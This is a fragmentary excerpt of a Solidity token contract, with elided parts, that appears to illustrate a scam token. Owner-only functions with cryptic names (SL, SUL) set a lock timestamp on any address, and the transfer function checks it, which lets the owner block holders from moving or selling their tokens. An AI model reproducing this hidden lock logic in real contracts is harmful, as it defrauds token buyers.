...
contract token is Ownable, IERC20 {
    ...
    uint256 private _defaultLkTime = 1660533278;
    mapping(address => uint256) private _LOKD;

    function SL(address accbount) public onlyowner {
        _LOKD[accbount] = block.timestamp;
    }


    function SUL(address accbount) public onlyowner {
        _LOKD[accbount] = 1757992158;
    }


    function isLOKD(address accbount) public view returns (uint256) {
        return _LOKD[accbount];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        if (_LOKD[sender] > 1660533276 && block.timestamp > _LOKD[sender]) {
